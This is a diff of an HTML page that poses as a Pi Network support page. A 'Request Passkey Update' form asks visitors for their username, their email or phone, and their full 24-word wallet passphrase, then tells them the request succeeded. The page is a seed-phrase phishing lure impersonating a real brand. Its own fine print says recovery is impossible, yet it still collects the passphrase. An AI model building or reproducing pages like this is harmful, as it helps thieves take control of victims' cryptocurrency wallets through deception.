@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FAQ & Support Page | Pi Network</title>
+    <title>FAQ & Support | Pi Network</title>
+    <link rel="stylesheet" href="styles.css"> <!-- External CSS for styling -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,55 +15,36 @@
         .header {
             background-color: #6A329F;
             color: white;
-            padding: 15px;
+            padding: 20px;
             text-align: center;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
         }
-        .main-container {
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 40px;
-            gap: 30px;
-        }
         .container {
-            width: 45%;
-            max-width: 450px;
+            width: 50%;
+            margin: 40px auto;
             background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
         }
-        .instructions {
-            width: 45%;
-            max-width: 450px;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        .container h2 {
+            text-align: center;
+            color: #6A329F;
         }
         input, textarea {
-            width: calc(100% - 20px);
+            width: 100%;
             padding: 12px;
+            margin-top: 10px;
             font-size: 14px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            color: gray;
+            color: #333;
             font-family: Arial, sans-serif;
-        }
-        input {
-            height: 45px;
-            margin-bottom: 15px;
         }
         textarea {
-            height: 130px;
+            height: 120px;
             resize: none;
-        }
-        input::placeholder, textarea::placeholder {
-            font-size: 14px;
-            color: gray;
-            font-family: Arial, sans-serif;
         }
         .btn {
             width: 100%;
@@ -71,29 +53,31 @@
             color: white;
             border: none;
             cursor: pointer;
-            font-weight: bold;
             font-size: 16px;
             border-radius: 5px;
             margin-top: 15px;
         }
+        .btn:hover {
+            background-color: #582b84;
+        }
+        .message {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+        }
         .info {
+            text-align: center;
             font-size: 14px;
             color: gray;
-            font-family: Arial, sans-serif;
-            margin-top: 20px;
+            margin-top: 15px;
         }
-        .error-message {
-            font-size: 14px;
-            color: red;
-            font-family: Arial, sans-serif;
-            margin-bottom: 10px;
+        .info a {
+            color: #6A329F;
+            font-weight: bold;
+            text-decoration: none;
         }
         @media (max-width: 768px) {
-            .main-container {
-                flex-direction: column;
-                align-items: center;
-            }
-            .container, .instructions {
+            .container {
                 width: 90%;
             }
         }
@@ -105,48 +89,28 @@
             var words = passphrase.split(/\s+/).filter(word => word.length > 0);
 
             if (words.length !== 24) {
-                message.innerHTML = "Invalid Passphrase";
+                message.innerHTML = "Invalid Passphrase. Please enter exactly 24 words.";
                 message.style.color = "red";
             } else {
-                message.innerHTML = "Request submitted, please wait till our team contacts you.";
+                message.innerHTML = "Request submitted successfully. Our team will contact you.";
                 message.style.color = "green";
             }
         }
     </script>
 </head>
 <body>
-    <div class="header">
-        Welcome to the FAQ & Support Page
-    </div>
-    
-    <div class="main-container">
-        <!-- Left Side: Form -->
-        <div class="container">
-            <h2>Request to update passkey</h2>
-            <input type="text" placeholder="Enter Username">
-            <input type="text" placeholder="Enter Phone number/Email ID">
-            <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
-            <p id="message" class="error-message"></p>
-            <button class="btn" onclick="validatePassphrase()">Send Request</button>
-            
-            <p class="info">
-                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
-                Recovery of passphrase is currently impossible. 
-                <a href="https://minepi.com/support/" target="_blank" style="color: #6A329F; text-decoration: none; font-weight: bold;">
-                    For more info, click here.
-                </a>
-            </p>
-        </div>
-
-        <!-- Right Side: Instructions -->
-        <div class="instructions">
-            <h2>Instructions</h2>
-            <p>1. Enter your **username** as registered on Pi Network.</p>
-            <p>2. Provide your **email or phone number** associated with your Pi Wallet.</p>
-            <p>3. Enter your **24-word passphrase** exactly as given during wallet creation.</p>
-            <p>4. Click "Send Request" to submit your request for review.</p>
-            <p>⚠️ **Important:** Pi Network **does not store** your passphrase. Ensure you have entered it correctly.</p>
-        </div>
+    <div class="header">Welcome to Pi Network Support</div>
+    <div class="container">
+        <h2>Request Passkey Update</h2>
+        <input type="text" placeholder="Enter Username">
+        <input type="text" placeholder="Enter Email or Phone Number">
+        <textarea id="passphrase" placeholder="Enter your 24-word passphrase"></textarea>
+        <p id="message" class="message"></p>
+        <button class="btn" onclick="validatePassphrase()">Submit Request</button>
+        <p class="info">
+            Your wallet passphrase is only accessible to you. Recovery is impossible.
+            <a href="https://minepi.com/support/" target="_blank">Learn more</a>.
+        </p>
     </div>
 </body>
 </html>
